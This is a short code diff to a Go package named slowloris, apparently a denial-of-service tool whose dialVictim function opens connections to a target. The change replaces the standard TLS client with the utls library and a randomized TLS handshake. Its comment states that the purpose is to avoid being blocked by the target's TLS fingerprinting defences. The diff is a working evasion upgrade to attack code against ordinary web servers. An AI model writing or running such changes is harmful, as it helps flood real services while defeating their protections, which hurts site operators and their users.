@@ -1,7 +1,6 @@
 package slowloris
 
 import (
-	"crypto/tls"
 	"fmt"
 	"io"
 	"log"
@@ -9,6 +8,8 @@ import (
 	"net/url"
 	"strings"
 	"time"
+
+	utls "github.com/refraction-networking/utls"
 )
 
 type Config struct {
@@ -120,9 +121,9 @@ func (s SlowLoris) dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 		return tcpConn
 	}
 
-	tlsConn := tls.Client(conn, &tls.Config{
-		InsecureSkipVerify: true,
-	})
+	// Use custom TLS connection to avoid being blocked on the target resource
+	// by the SSL fingerprinting (https://ja3er.com/about.html)
+	tlsConn := utls.UClient(tcpConn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
 
 	if err = tlsConn.Handshake(); err != nil {
 		conn.Close()
